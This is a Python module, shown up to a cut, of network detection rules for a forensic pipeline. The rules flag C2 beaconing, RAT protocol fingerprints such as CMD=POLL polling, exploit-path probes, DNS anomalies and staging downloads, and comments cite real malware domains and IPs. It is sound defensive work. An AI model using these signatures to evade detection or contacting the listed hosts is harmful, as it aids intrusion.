"""pcap/rules.py — PCAP detection rules for the Spectre pipeline.

Rule inventory:
  pcap-suspicious-port    — ports used by offensive tooling (existing, kept)
  pcap-beacon             — statistical beacon detection (60s intervals)
  pcap-c2-protocol        — RAT fingerprinting (NetSupport, Cobalt Strike, HTTP-on-443)
  pcap-exploit-probe      — known CVE exploit path matching
  pcap-dns-anomaly        — suspicious TLDs, DGA patterns

All rules are pure predicates: (NormEvent) -> Optional[Anchor]. No I/O.
Unit-testable against sample NormEvents with known-good/known-bad data.
"""

from __future__ import annotations

import ipaddress
import re
from typing import Optional

from spectre.core.base import Anchor, NormEvent, Rule, RuleMetadata
from spectre.knowledge import load_indicator_list, load_indicator_map
from spectre.modules.pcap.beacon_score import score_beacon
from spectre.modules.pcap.normalize import extract_payload_hosts

ARTIFACT = "pcap_conn"

# ── Indicator lists ──────────────────────────────────────────────────
_PASTE_SHARE_HOSTS = tuple(load_indicator_list("network", "paste_share_hosts"))
_SUSPICIOUS_PORTS = frozenset(load_indicator_list("network", "suspicious_ports"))
_EXPOSED_SERVICE_PORTS = frozenset(load_indicator_list("network", "exposed_service_ports"))
_C2_USER_AGENTS = frozenset(load_indicator_list("network", "c2_user_agents"))
_CAMPAIGN_TAGS = load_indicator_map("network", "campaign_tags")
# Known C2 campaign parameter keys to search for in query strings / response bodies
_CAMPAIGN_PARAM_KEYS = frozenset(load_indicator_list("network", "campaign_param_keys"))
_C2_SERVER_HEADERS = frozenset(load_indicator_list("network", "c2_server_headers"))
_EXPLOIT_PATHS = {
    entry["path"]: entry
    for entry in load_indicator_list("network", "exploit_paths")
}
# ponytail: outbound server-response FP — when the monitored host sends
# from a well-known port (< 49152), it's replying to a scanner, not
# initiating a client connection (which uses ephemeral src_port >= 49152).
_EPHEMERAL_MIN = 49152

# ── Track L: OS derivation from the "Windows NT x.y" User-Agent token ──
# Deterministic lookup only — no network, no intel DB. Maps the NT version a
# client advertises to the human OS name it identifies. EOL is deliberately
# NOT asserted here (time-relative interpretation belongs to the narrative,
# which now has the OS + build facts to reason from).
_NT_VERSION_TO_OS = {
    "5.1": "Windows XP",
    "5.2": "Windows XP x64 / Server 2003",
    "6.0": "Windows Vista / Server 2008",
    "6.1": "Windows 7 / Server 2008 R2",
    "6.2": "Windows 8 / Server 2012",
    "6.3": "Windows 8.1 / Server 2012 R2",
    "10.0": "Windows 10/11 / Server 2016+",
}
_NT_TOKEN_RE = re.compile(r"Windows NT (\d+\.\d+)", re.IGNORECASE)


def _os_from_ua(ua: str) -> str:
    """Map the 'Windows NT x.y' token in a User-Agent to a human OS name.

    Returns '' when no 'Windows NT x.y' token is present (never fabricates an
    OS). Echoes the raw NT token, names an unknown NT version as bare
    'Windows', and appends a WOW64 note (32-bit process on 64-bit Windows)
    when the UA advertises it.
    """
    m = _NT_TOKEN_RE.search(ua or "")
    if not m:
        return ""
    ver = m.group(1)
    name = _NT_VERSION_TO_OS.get(ver, "Windows")
    out = f"{name} (NT {ver})"
    if "wow64" in ua.lower():
        out += " [WOW64 — 32-bit process on 64-bit Windows]"
    return out

# ── Per-condition MITRE technique sets ──────────────────────────────
# Exposed as module constants (not just buried in the predicate bodies) so
# the mitre-map consistency test can import and assert each ⊆ its map
# entry's `allowed` list directly, without reconstructing trigger inputs.

# pcap-suspicious-port — allowed: [T1571, T1071.001]
_MITRE_PORT_OUTBOUND = ["T1071.001", "T1571"]
_MITRE_PORT_OTHER = ["T1571"]

# pcap-exposed-service — allowed: [T1133]
_MITRE_EXPOSED_SERVICE = ["T1133"]

# pcap-beacon — allowed: [T1071.001] (timing pass drops the port, so no
# encrypted-channel refinement is claimed — see beacon())
_MITRE_BEACON_BASE = ["T1071.001"]

# pcap-c2-protocol — allowed: [T1071.001, T1090.004, T1573.001, T1132.001]
_MITRE_C2_PLAINTEXT = ["T1071.001"]           # plaintext HTTP on 443 / bare HTTP response
_MITRE_C2_USER_AGENT = ["T1071.001"]          # known RAT/C2 User-Agent
_MITRE_C2_SERVER_HEADER = ["T1071.001", "T1090.004"]  # domain-fronting-ish server header
_MITRE_C2_POLL = ["T1071.001", "T1132.001"]   # CMD=POLL/ENCD remote-access protocol
_MITRE_C2_CHECKIN_HOST = ["T1071.001"]        # suspicious self-locate/checkin Host header
_MITRE_C2_CAMPAIGN = ["T1071.001", "T1132.001"]  # known campaign tag/param

# pcap-dns-anomaly — allowed: [T1568.002, T1568, T1071.004]
_MITRE_DNS_TLD = ["T1568"]
_MITRE_DNS_DGA = ["T1568.002"]
_MITRE_DNS_WPAD = ["T1071.004"]

# pcap-payload-host — allowed: [T1105]
_MITRE_PAYLOAD_HOST = ["T1105"]


def _merge_mitre(*groups: list[str]) -> list[str]:
    """Order-preserving de-duplicated union of technique-ID lists."""
    merged: list[str] = []
    for group in groups:
        for tid in group:
            if tid not in merged:
                merged.append(tid)
    return merged

# ── Recognizers ──────────────────────────────────────────────────────

# Known-CDN / legitimate-infrastructure IP ranges that should never
# trigger beacon/C2 alerts. A5 Finding 2 / A11 fix: real CIDR blocks,
# matched via ipaddress network containment — NOT bare string prefixes
# (the old '13.'/'20.'/'40.'/'52.'/'104.' entries each blanket-matched an
# entire /8, and generic multi-tenant Azure ranges were dropped entirely
# rather than narrowed — see knowledge/indicators/network.yaml's
# benign_infra_ip_cidrs description for why).
_LEGITIMATE_IP_NETWORKS = tuple(
    ipaddress.ip_network(entry["cidr"])
    for entry in load_indicator_list("network", "benign_infra_ip_cidrs")
)

# External IP/geo-lookup services abused by malware to self-locate before
# beaconing — Host-header match is a moderate-confidence signal.
_C2_CHECKIN_HOSTS = frozenset(load_indicator_list("network", "c2_checkin_hosts"))

# CRL/OCSP and other cert-validation infrastructure — never a C2 indicator
# even when the query pattern looks suspicious (Google-CRL FP class).
_BENIGN_INFRA_DOMAINS = frozenset(
    load_indicator_list("network", "benign_infra_domains")
)


def _is_private(ip: str) -> bool:
    """Return True if *ip* belongs to a private/RFC 1918 range."""
    if ip.startswith("10.") or ip.startswith("192.168."):
        return True
    if ip.startswith("172."):
        try:
            second = int(ip.split(".")[1])
            if 16 <= second <= 31:
                return True
        except (IndexError, ValueError):
            pass
    return False


def _is_legitimate_ip(ip: str) -> bool:
    """Quick filter: is this IP in a known-legitimate infrastructure range?"""
    if _is_private(ip):
        return True
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return any(addr in net for net in _LEGITIMATE_IP_NETWORKS)


def _remote_ip(e: NormEvent) -> str:
    """Return the single REMOTE (non-monitored-host) endpoint for a
    directional event — the monitored host is never an attacker IOC.

    inbound  -> src_ip (the remote prober/attacker)
    outbound -> dst_ip (the remote server being contacted)
    otherwise (internal/unknown/no direction) -> the address that isn't
    NormEvent.host, when host is known; falls back to dst_ip.
    """
    d = e.data
    src_ip = d.get("src_ip", "")
    dst_ip = d.get("dst_ip", "")
    direction = d.get("direction", "")
    if direction == "inbound":
        return src_ip
    if direction == "outbound":
        return dst_ip
    host = e.host or ""
    if host:
        if dst_ip == host:
            return src_ip
        if src_ip == host:
            return dst_ip
    return dst_ip or src_ip


_IPV4_LITERAL = re.compile(r'^\d{1,3}(?:\.\d{1,3}){3}$')


def _c2_host_domain(host: str) -> Optional[str]:
    """Normalize an HTTP Host header to a domain IOC, or None when it is not a
    usable hostname. Strips a trailing numeric ':port', lowercases, drops a
    trailing dot, and rejects bare IP literals (an IP belongs in the ip IOC
    list; a domain IOC that is an IP is malformed and fails grounding)."""
    if not host:
        return None
    h = host.strip().lower()
    # strip a trailing :port only when the suffix is numeric (leave IPv6 alone)
    if ":" in h:
        head, _, tail = h.rpartition(":")
        if head and tail.isdigit():
            h = head
    h = h.strip("[]").rstrip(".")
    if not h or _IPV4_LITERAL.match(h):
        return None
    if ":" in h:            # residual colon → IPv6 literal, not a domain
        return None
    if not any(c.isalpha() for c in h):
        return None
    return h


# ── Rule: suspicious-port ────────────────────────────────────────────

def suspicious_port(e: NormEvent) -> Optional[Anchor]:
    d = e.data
    if d.get("dst_port") in _SUSPICIOUS_PORTS:
        dst_ip = d.get("dst_ip", "")
        src_ip = d.get("src_ip", "")
        direction = d.get("direction", "unknown")
        src_port = d.get("src_port", 0)

        # ponytail: server-response FP — monitored host replying from a
        # well-known port (< ephemeral range) to a scanner's ephemeral port.
        # The dst_port looks suspicious but the host is just responding.
        # Fails open: an unparseable/missing src_port must NOT suppress —
        # only a confirmed well-known numeric port does.
        try:
            src_is_well_known = 0 < int(src_port) < _EPHEMERAL_MIN
        except (TypeError, ValueError):
            src_is_well_known = False
        if direction == "outbound" and src_is_well_known:
            return None

        if direction == "outbound":
            confidence = 0.7
            mitre = _MITRE_PORT_OUTBOUND
            title_prefix = "Outbound connection from internal host"
        elif direction == "inbound":
            confidence = 0.4
            mitre = _MITRE_PORT_OTHER
            title_prefix = "Inbound connection"
        elif direction == "internal":
            confidence = 0.5
            mitre = _MITRE_PORT_OTHER
            title_prefix = "Internal connection"
        else:
            confidence = 0.4
            mitre = _MITRE_PORT_OTHER
            title_prefix = "Connection"

        # The monitored host is never an IOC — only the REMOTE address for
        # each direction: outbound → dst_ip, inbound → src_ip (the prober).
        # internal/unknown keep the pre-existing dst_ip behavior.
        if direction == "inbound":
            remote_ip = src_ip
        else:
            remote_ip = dst_ip
        iocs = {
            "filepath": [], "ip": [remote_ip],
            "domain": [], "sha256": [], "registry_key": [],
        }
        title = (f"{title_prefix} to commonly-malicious port "
                 f"{d.get('dst_port')} (remote: {dst_ip}, source: {src_ip})")

        return Anchor(
            rule_id="pcap-suspicious-port",
            artifact_type=ARTIFACT,
            event=e,
            title=title,
            mitre=mitre,
            confidence=confidence,
            iocs=iocs,
            summary=f"pcap [{direction}]: {d.get('raw', '')}",
            dedup_key=f"{direction}:{dst_ip}",
        )
    return None


# ── Rule: exposed listening service ──────────────────────────────────
# gold-003: MongoDB exposed on 27017, no auth, reachable from the internet.
# suspicious_port already port-matches 27017 on ANY direction, but that
# conflates two very different risk classes: the monitored host REACHING
# OUT to an offensive-tooling port (C2), and the monitored host ANSWERING
# INBOUND on a sensitive database/cache/search port it should never expose.
# This rule isolates the second case with its own MITRE mapping (T1133,
# External Remote Services) so a report can say "exposed service", not
# "outbound C2", when that's what actually happened.
#
# Extractor limitation: extract.py's connections pass runs
# `tcpdump -nn -tttt -q -r <pcap>` (note -q), which NEVER emits TCP flags —
# there is no SYN/SYN-ACK/ACK field anywhere in normalize.py's pcap_conn
# events, only the derived `direction` (inbound/outbound/internal/unknown).
# A true "monitored host completed the handshake" check is therefore not
# available from this data. The rule is scoped to what direction DOES
# provide: any inbound connection record (an external host's packet whose
# destination is the monitored host) on a sensitive service port. This is
# a lower bar than a confirmed 3-way handshake — a lone inbound SYN with no
# reply would also match — but it is the strongest signal the -q extractor
# carries, and the monitored host being the DESTINATION on a listening
# service port is itself informative regardless of handshake completion.


def exposed_service(e: NormEvent) -> Optional[Anchor]:
    d = e.data
    if d.get("dst_port") not in _EXPOSED_SERVICE_PORTS:
        return None
    if d.get("direction") != "inbound":
        return None

    dst_port = d.get("dst_port")
    dst_ip = d.get("dst_ip", "")
    # Inbound: the remote prober/client is the IOC, never the monitored
    # host being connected to.
    remote_ip = _remote_ip(e)
    iocs = {
        "filepath": [], "ip": [remote_ip], "domain": [],
        "sha256": [], "registry_key": [],
    }
    return Anchor(
        rule_id="pcap-exposed-service",
        artifact_type=ARTIFACT,
        event=e,
        title=(f"Exposed listening service on port {dst_port} "
               f"(host: {dst_ip}, reachable from: {remote_ip})"),
        mitre=_MITRE_EXPOSED_SERVICE,
        confidence=0.6,
        iocs=iocs,
        summary=f"pcap [inbound]: {d.get('raw', '')}",
        dedup_key=f"{dst_port}:{dst_ip}",
    )


# ── Rule: beacon detection ───────────────────────────────────────────
# The beacon rule is DIFFERENT from other rules: it operates on
# aggregated per-IP timestamp data, not individual NormEvents.
# It runs as a post-normalize aggregator, consuming the
# raw_extract/per_ip_timestamps.csv output.
#
# For now, this rule fires on NormEvents that carry beacon_data in
# the data dict (injected by a pre-processor that reads the CSV).
# The alternative is a separate aggregation phase — this is simpler
# and keeps the rule pure (no I/O).

def beacon(e: NormEvent) -> Optional[Anchor]:
    """Detect C2 beaconing from per-IP timing data."""
    d = e.data
    beacon_data = d.get("beacon_data")
    if not beacon_data:
        return None

    ip = beacon_data.get("ip", "")
    intervals = beacon_data.get("intervals", [])
    sample_count = beacon_data.get("sample_count", 0)
    # beacon_data["mean_interval"] is deliberately NOT read: the mean is the
    # statistic this rule stopped trusting (see beacon_score.py). It stays in
    # the normalized event for back-compat and for anything that wants the
    # raw series, but the finding reports the median.

    # Skip known-legitimate infrastructure
    if _is_legitimate_ip(ip):
        return None

    # ponytail (gold-003): an inbound scanner probing many ports still gets
    # a reply from the monitored host's TCP/IP stack for EVERY probe,
    # producing the exact same regular per-IP timing signature as genuine
    # beaconing (F-270-034: 103.75.180.126, a port-scanner, 101 "beacons"
    # that were actually the monitored host's own reply packets). A raw
    # packet-count/interval signature alone cannot tell "the monitored host
    # initiated" from "the monitored host mechanically replied" — both are
    # ~50/50 request/reply pairs. normalize_beacon_timing threads the
    # monitored host's own source port for each outbound-attributed sample
    # through as monitored_is_client, using the same ephemeral-vs-
    # well-known-port discipline suspicious_port() already uses: a real
    # beacon is the monitored host acting as a CLIENT (OS-assigned
    # ephemeral src port); a scanner-triggered reply is the monitored host
    # acting as a SERVER, replying from whatever (non-ephemeral) port it
    # was probed on. monitored_is_client is None when the signal isn't
    # available (e.g. no monitored_ip was ever resolved, or a hand-built
    # event carries no port data) — fail OPEN in that case, the same
    # discipline as the `direction != "inbound"` guards elsewhere in this
    # module. Only a definitive False suppresses the finding.
    if beacon_data.get("monitored_is_client") is False:
        return None

    score = score_beacon(intervals)
    confidence = score["confidence"]
    if confidence <= 0.0:
        return None

    # NOTE: a `stdev > mean_interval` guard used to sit here, on the reasoning
    # that σ > μ means random rather than periodic. Measured against the
    # XLoader sample it rejected 6 of the 7 genuine C2 beacons: real interval
    # series carry outliers (missed check-ins, retransmits) that inflate σ
    # without making the series aperiodic — 151.243.184.14 has σ 128.2 against
    # μ 101.1 yet a MAD of 0.00 around a 2.6s median. Robust dispersion is
    # already the periodicity test, so the guard was pure false-negative and
    # has been removed rather than reimplemented.

    iocs = {
        "filepath": [], "ip": [ip], "domain": [],
        "sha256": [], "registry_key": [],
    }
    # The timing pass aggregates per-IP inter-arrival deltas via an awk
    # pipeline that discards the port, so a beacon's destination port never
    # reaches this rule. pcap-beacon therefore maps to the base
    # application-layer-protocol technique only — an encrypted-channel
    # (T1573.001) refinement would need a port the deterministic extractor
    # does not carry, so it is deliberately not claimed here.
    median_interval = score["median_interval"]
    return Anchor(
        rule_id="pcap-beacon",
        artifact_type="pcap_timing",
        event=e,
        title=(f"C2 Beacon detected: {ip} — {sample_count} beacons at "
               f"{median_interval:.0f}s intervals (MAD={score['mad']:.1f}s)"),
        mitre=_MITRE_BEACON_BASE,
        confidence=confidence,
        iocs=iocs,
        # Carries the scorer identity and every input the confidence was
        # derived from, so the finding shows its work and a past case stays
        # reproducible when the scorer changes. Reaches the finding as
        # `corroboration_note` (phase_runner.py passes Anchor.summary there).
        summary=(f"pcap beacon: {ip} — {sample_count} samples, "
                 f"median={median_interval:.1f}s, MAD={score['mad']:.2f}s, "
                 f"rCV={score['rcv']:.4f} "
                 f"[scorer={score['scorer_version']}]"),
        dedup_key=ip,
    )


# ── Rule: C2 protocol fingerprinting ─────────────────────────────────

# Patterns that indicate plaintext HTTP on port 443 (evasion)
_PLAINTEXT_ON_443 = re.compile(
    r'(GET|POST|PUT|DELETE|HEAD)\s+http[s]?://', re.IGNORECASE
)

# A genuine bare HTTP/1.x status line (e.g. "HTTP/1.1 200 OK") or request
# line (METHOD SP path SP HTTP/1.x) on a TLS port — NOT a bare "http/1.1"
# substring, which also matches the literal ALPN protocol-name token
# ("h2, http/1.1") present in the TLS ClientHello/ServerHello extension of
# virtually every ordinary HTTPS connection (gold-002: F-269-003,
# watson.events.data.microsoft.com — genuine TLS, zero plaintext HTTP
# anywhere, flagged purely off that ALPN text under the old regex).
_BARE_HTTP_ON_443 = re.compile(
    r'HTTP/1\.[01]\s+\d{3}\b'
    r'|\b(?:GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH)\s+\S+\s+HTTP/1\.[01]\b',
    re.IGNORECASE,
)

# CMD=POLL / CMD=ENCD pattern — remote access polling protocol
_REMOTE_ACCESS_POLL = re.compile(r'CMD=(POLL|ENCD|SEND|RECV)', re.IGNORECASE)


def c2_protocol(e: NormEvent) -> Optional[Anchor]:
    """Fingerprint C2/RAT protocols from HTTP headers."""
    d = e.data
    dst_port = d.get("dst_port", "")
    raw = d.get("raw", "").lower()

    triggers = []
    mitre_groups: list[list[str]] = []
    confidence = 0.0
    # Set when a check fires whose Host header is the genuine resolved C2
    # domain (Checks 2/3/4/6 — normal-port C2 check-ins). Deliberately NOT
    # set by Check 1 (plaintext/bare HTTP on 443 is an evasion channel whose
    # Host header is often a forged decoy — e.g. a 443-evasion upload spoofing
    # "Host: www.baidu.com") or Check 5 (benign ip-discovery services).
    host_is_c2_infra = False

    # Check 1: Plaintext HTTP on port 443 (strong evasion indicator). Only
    # implicates the monitored host as a C2 client when it's the one
    # exhibiting the behavior — on inbound traffic this is a remote
    # scanner/prober's request landing on our port 443 (gold-003:
    # F-270-024/025/033 were exactly this — inbound HTTP hitting the HTTPS
    # port, not the monitored host doing C2). Skip inbound, same
    # discipline as Checks 3-6.
    if (d.get("direction", "") != "inbound"
            and dst_port in ("443", "8443")
            and _PLAINTEXT_ON_443.search(d.get("ascii_payload", ""))):
        triggers.append("plaintext HTTP on port 443")
        mitre_groups.append(_MITRE_C2_PLAINTEXT)
        confidence = max(confidence, 0.70)

    # Also flag a genuine bare HTTP/1.x status or request line on a TLS
    # port (bare HTTP, no TLS handshake at all) — see _BARE_HTTP_ON_443
    # for why this no longer matches a bare "HTTP/1.1" substring. Skip
    # inbound for the same reason as above.
    if (d.get("direction", "") != "inbound"
            and dst_port in ("443", "8443")
            and _BARE_HTTP_ON_443.search(d.get("raw", ""))):
        triggers.append("HTTP response on port 443 (non-TLS)")
        mitre_groups.append(_MITRE_C2_PLAINTEXT)
        confidence = max(confidence, 0.80)

    # Check 2: Known RAT User-Agent — implies the MONITORED HOST is the C2
    # client (it sent this UA). On inbound traffic the UA belongs to the
    # remote requester (e.g. zgrab/Xpanse/libredtail-http/xfa1 scanning our
    # server), not to us — skip inbound, same discipline as Check 3.
    ua_fired = False
    full_ua = ""
    if d.get("direction", "") != "inbound":
        ua = d.get("http_user_agent", "")
        # sorted(): frozenset iteration order is hash-randomized per
        # process (PYTHONHASHSEED); multiple matches join into the title
        # (~line 630), so unsorted iteration would make the same evidence
        # produce a differently-worded title across runs (WS5).
        for sig in sorted(_C2_USER_AGENTS):
            if sig.lower() in ua.lower():
                triggers.append(f"User-Agent matches: {sig}")
                mitre_groups.append(_MITRE_C2_USER_AGENT)
                confidence = max(confidence, 0.85)
                host_is_c2_infra = True
                ua_fired = True
                full_ua = ua  # Track L: keep the whole header, not just sig

    # Check 3: Known C2 Server header (skip inbound — our server responding to scanners)
    # ponytail: direction guard prevents false positives when our own servers
    # respond to inbound scanners (e.g., Apache/2.4.58 on victim infrastructure)
    server = d.get("http_server", "")
    if server:
        # Only flag when the remote endpoint sent the server header (outbound)
        if d.get("direction", "") != "inbound":
            # sorted(): see the WS5 note on the User-Agent loop above —
            # same hash-randomization hazard, same fix.
            for sig in sorted(_C2_SERVER_HEADERS):
                if sig.lower() in server.lower():
                    triggers.append(f"Server header matches: {sig}")
                    mitre_groups.append(_MITRE_C2_SERVER_HEADER)
                    confidence = max(confidence, 0.90)
                    host_is_c2_infra = True

    # Check 4: CMD=POLL/ENCD pattern (remote access protocol) — the
    # monitored host issuing this poll is the C2 client; on inbound traffic
    # it's a remote endpoint sending us this string (e.g. scanner/probe
    # replaying a signature), not us polling out. Skip inbound.
    if d.get("direction", "") != "inbound" and _REMOTE_ACCESS_POLL.search(raw):
        triggers.append("CMD=POLL/ENCD remote-access protocol")
        mitre_groups.append(_MITRE_C2_POLL)
        confidence = max(confidence, 0.85)
        host_is_c2_infra = True

    # Check 5: Suspicious Host headers (external service proxy checks) — a
    # request's Host header names the destination the REQUESTER is calling.
    # It only implicates the monitored host as a C2 client when the
    # monitored host is the one making the request (outbound). On inbound
    # traffic the Host header is set by the remote requester and says
    # nothing about the monitored host's behavior. Skip inbound.
    host = d.get("http_host", "")
    if d.get("direction", "") != "inbound" and any(h in host.lower() for h in _C2_CHECKIN_HOSTS):
        triggers.append(f"suspicious Host header: {host}")
        mitre_groups.append(_MITRE_C2_CHECKIN_HOST)
        confidence = max(confidence, 0.50)

    # Check 6: Known malware campaign tags in query strings / response bodies
    # ponytail: search all known param keys; z8 values map to family, rest flag as-is
    # Campaign tags in a request path are sent by the requester — they
    # implicate the monitored host as a C2 client only when the monitored
    # host issued the request (outbound). Skip inbound (e.g. a scanner
    # replaying a known param at our server is not us checking in).
    if d.get("direction", "") != "inbound":
        search_text = d.get("http_request_path", "") + " " + d.get("ascii_payload", "")
        # sorted(): see the WS5 note on the User-Agent loop above — same
        # hash-randomization hazard, same fix.
        for param_key in sorted(_CAMPAIGN_PARAM_KEYS):
            m = re.search(rf'\b{re.escape(param_key)}=([^&\s]+)', search_text)
            if m:
                val = m.group(1)
                if param_key == "z8":
                    family = _CAMPAIGN_TAGS.get(val, "")
                    label = f"Campaign tag z8={val}"
                    if family:
                        label += f" ({family})"
                else:
                    label = f"C2 parameter {param_key}={val}"
                triggers.append(label)
                mitre_groups.append(_MITRE_C2_CAMPAIGN)
                confidence = max(confidence, 0.85)
                host_is_c2_infra = True

    if not triggers:
        return None

    mitre = _merge_mitre(*mitre_groups)

    # The monitored host is never an IOC — only the REMOTE endpoint. On
    # inbound traffic dst_ip IS the monitored host; picking dst_ip
    # unconditionally would list the victim as the attacker.
    ip = _remote_ip(e)

    # Harvest the request's Host header as a C2 domain IOC when a "host-is-C2"
    # check fired (Checks 2/3/4/6 — UA / Server / POLL / campaign tag, where
    # the Host is the genuine resolved C2 domain). This surfaces normal-TLD C2
    # domains that dns_anomaly's suspicious-TLD list misses (gold-001: ~46
    # XLoader Host-header domains). host_is_c2_infra is deliberately NOT set by
    # Check 1 (443-evasion Host headers are often forged decoys) or Check 5
    # (benign ip-discovery services); every contributing check is outbound-
    # gated, so the harvest inherits that discipline.
    domain_iocs: list[str] = []
    if host_is_c2_infra:
        hd = _c2_host_domain(host)
        if hd:
            domain_iocs = [hd]

    iocs = {
        "filepath": [], "ip": [ip], "domain": domain_iocs,
        "sha256": [], "registry_key": [],
    }
    # Track L: when the UA check fired, carry the FULL header + derived OS on
    # the summary (finding evidence text) but NOT the title — the ~90-char
    # header would bloat every C2 finding title. Pipe-delimited markers the
    # Track H report parsers key off; the full UA holds no KEY=VALUE and no
    # "User-Agent matches:" substring, so existing parsers can't false-match.
    summary = f"pcap C2: {', '.join(triggers)}"
    if ua_fired and full_ua:
        summary += f" | host User-Agent (full): {full_ua}"
        os_str = _os_from_ua(full_ua)
        if os_str:
            summary += f" | host OS (from UA): {os_str}"
    # A11-01/02: dedup_key used to be the bare destination IP, so two
    # DISTINCT malicious domains sharing one hosting IP (common —
    # bulletproof/cheap hosting routinely serves several campaign domains
    # off one server) collapsed into a single correlation claim
    # ((rule_id, dedup_key) grouping in correlation.corroborate()) and the
    # second domain silently vanished from the case (real XLoader capture:
    # www.e9ebq23.store dropped because it shares 8.212.120.56 with
    # www.cpcrayd.store). Scope the key by (ip, host) instead — distinct
    # Host headers on one IP now surface as distinct findings, while the
    # SAME domain repeatedly hitting the SAME IP still collapses to one.
    host_key = host.strip().lower() if host else ""
    dedup_key = f"{ip}|{host_key}" if host_key else ip
    return Anchor(
        rule_id="pcap-c2-protocol",
        artifact_type="pcap_http",
        event=e,
        title=f"C2 protocol fingerprint: {'; '.join(triggers)} ({ip})",
        mitre=mitre,
        confidence=confidence,
        iocs=iocs,
        summary=summary,
        dedup_key=dedup_key,
    )


# ── Rule: exploit probe detection ────────────────────────────────────

def exploit_probe(e: NormEvent) -> Optional[Anchor]:
    """Match HTTP request paths against known CVE exploit signatures."""
    d = e.data
    request_path = d.get("http_request_path", "")

    if not request_path:
        return None

    # Match against known exploit paths
    for sig_path, meta in _EXPLOIT_PATHS.items():
        if sig_path in request_path:
            # Exploit probes are typically inbound (attacker -> victim), so
            # dst_ip is usually the monitored host — use _remote_ip so the
            # attacker's IP is the IOC, never the monitored host.
            iocs = {
                "filepath": [], "ip": [_remote_ip(e)], "domain": [],
                "sha256": [], "registry_key": [],
            }
            return Anchor(
                rule_id="pcap-exploit-probe",
                artifact_type="pcap_http",
                event=e,
                title=f"Exploit probe: {meta.get('name', sig_path)} "
                      f"({meta.get('cve', 'no CVE')})",
                mitre=meta.get("mitre", ["T1595.002"]),
                confidence=meta.get("confidence", 0.6),
                iocs=iocs,
                summary=f"pcap exploit: {request_path}",
                dedup_key=sig_path,
            )
    return None


# ── Rule: DNS anomaly ────────────────────────────────────────────────

_SUSPICIOUS_TLDS = frozenset(
    load_indicator_list("network", "suspicious_tlds")
)

# DGA-like domain pattern: high entropy or random-looking subdomain
_DGA_PATTERN = re.compile(r'^[a-z0-9]{20,}\.', re.IGNORECASE)


def dns_anomaly(e: NormEvent) -> Optional[Anchor]:
    """Detect DNS anomalies: suspicious TLDs, DGA patterns."""
    d = e.data
    domain = d.get("dns_query", "")

    if not domain:
        return None

    domain_lower = domain.lower().rstrip(".")

    # Guard: CRL/OCSP and other cert-validation infrastructure — Windows/
    # browsers query these automatically; never a C2 indicator even when
    # the query pattern looks suspicious (kills the Google/MS-CRL FP class).
    if any(domain_lower == d or domain_lower.endswith("." + d)
           for d in _BENIGN_INFRA_DOMAINS):
        return None

    triggers = []
    mitre_groups: list[list[str]] = []
    confidence = 0.0

    # Check 1: Suspicious TLD
    # sorted(): frozenset iteration order is hash-randomized per process
    # (PYTHONHASHSEED); matches join into the title (~line 738 at time of
    # writing), so unsorted iteration would make the same evidence produce
    # a differently-worded title across runs (WS5).
    for tld in sorted(_SUSPICIOUS_TLDS):
        if domain_lower.endswith("." + tld):
            triggers.append(f"suspicious TLD: .{tld}")
            mitre_groups.append(_MITRE_DNS_TLD)
            confidence = max(confidence, 0.60)

    # Check 2: DGA-like subdomain
    if _DGA_PATTERN.search(domain_lower):
        triggers.append("DGA-like domain pattern")
        mitre_groups.append(_MITRE_DNS_DGA)
        confidence = max(confidence, 0.65)

    # Check 3: WPAD query to non-corporate domain
    if "wpad" in domain_lower and not any(
        d in domain_lower for d in ("mshome.net", "corp", "local", "internal")
    ):
        triggers.append("WPAD query to potentially abusive domain")
        mitre_groups.append(_MITRE_DNS_WPAD)
        confidence = max(confidence, 0.40)  # low confidence — could be misconfigured

    if not triggers:
        return None

    mitre = _merge_mitre(*mitre_groups)
    iocs = {
        "filepath": [], "ip": [], "domain": [domain_lower],
        "sha256": [], "registry_key": [],
    }
    return Anchor(
        rule_id="pcap-dns-anomaly",
        artifact_type="pcap_dns",
        event=e,
        title=f"DNS anomaly: {'; '.join(triggers)} — {domain_lower}",
        mitre=mitre,
        confidence=confidence,
        iocs=iocs,
        summary=f"pcap DNS anomaly: {domain_lower} ({', '.join(triggers)})",
        dedup_key=domain_lower,
    )


# ── Rule: staging download (pcap_flow) ───────────────────────────────
# gold-001 G-002: catbox.moe staging download — 1.5MB, DNS-resolved,
# immediately preceding C2 onset. Invisible without per-flow aggregation.

_STAGING_MIN_BYTES = 1_000_000
_STAGING_MIN_RATIO = 5


def staging_download(e: NormEvent) -> Optional[Anchor]:
    """Detect a large, download-dominant flow to a known file-sharing/
    staging host (resolved via DNS answers in enrich.py) or a suspicious
    TLD."""
    d = e.data
    bytes_in = d.get("bytes_in", 0)
    bytes_out = d.get("bytes_out", 0)
    direction_ratio = d.get("direction_ratio", bytes_in / max(bytes_out, 1))

    if bytes_in < _STAGING_MIN_BYTES or direction_ratio < _STAGING_MIN_RATIO:
        return None

    domain = d.get("resolved_domain", "")
    domain_lower = domain.lower().rstrip(".")
    if not domain_lower:
        return None  # no DNS resolution — never guess the host's purpose

    is_paste_share = any(domain_lower.endswith(h) for h in _PASTE_SHARE_HOSTS)
    tld = domain_lower.rsplit(".", 1)[-1] if "." in domain_lower else ""
    is_suspicious_tld = tld in _SUSPICIOUS_TLDS
    if not (is_paste_share or is_suspicious_tld):
        return None

    remote_ip = d.get("remote_ip", "")
    mb = bytes_in / 1_000_000
    iocs = {
        "filepath": [], "ip": [remote_ip], "domain": [domain_lower],
        "sha256": [], "registry_key": [],
    }
    return Anchor(
        rule_id="pcap-staging-download",
        artifact_type="pcap_flow",
        event=e,
        title=(f"Large download from file-sharing/staging host "
               f"{domain_lower} ({remote_ip}, {mb:.1f} MB)"),
        mitre=["T1105"],
        confidence=0.7,
        iocs=iocs,
        summary=(f"pcap flow: {bytes_in} bytes in / {bytes_out} bytes out "
                  f"with {remote_ip} ({domain_lower})"),
        dedup_key=remote_ip,
    )


# ── Rule: large transfer (pcap_flow) ─────────────────────────────────
# gold-001 G-004: 9.6MB secondary-C2 transfer to 23.205.110.9. Fires
# alongside pcap-staging-download when both independently match — the
# staging rule requires DNS resolution + host/TLD match, this one is a
# pure volume outlier and needs neither.

_LARGE_TRANSFER_MIN_BYTES = 5_000_000


def large_transfer(e: NormEvent) -> Optional[Anchor]:
    """Detect a flow whose total volume (either direction) is a volume
    outlier — outbound-dominant reads as possible exfiltration (T1041),
    inbound-dominant as a large ingress transfer (T1105)."""
    d = e.data
    bytes_in = d.get("bytes_in", 0)
    bytes_out = d.get("bytes_out", 0)
